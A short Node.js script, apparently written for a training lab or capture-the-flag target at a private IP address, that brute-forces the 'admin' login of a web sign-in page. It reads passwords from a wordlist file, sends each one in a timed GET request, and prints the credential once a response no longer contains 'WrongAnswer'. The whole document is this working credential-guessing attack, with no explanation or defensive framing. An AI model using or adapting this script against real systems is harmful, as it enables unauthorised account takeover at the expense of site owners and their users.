const fs = require('fs');
const axios = require('axios');
const { exit } = require('process');


const password = fs.readFileSync('./password.txt')
const data = password.toString().split('\n')
console.log(data)
data.map((pass, index) => {
    setTimeout(() => {
        axios.get(`http://10.12.100.5/?page=signin&username=admin&password=${pass}&Login=Login`).then(res => {
            if (res.data.indexOf('WrongAnswer') == -1)
            {
                console.log("username: admin, password: " + pass)
                exit();
            }
        })
      }, 500 * index)
})
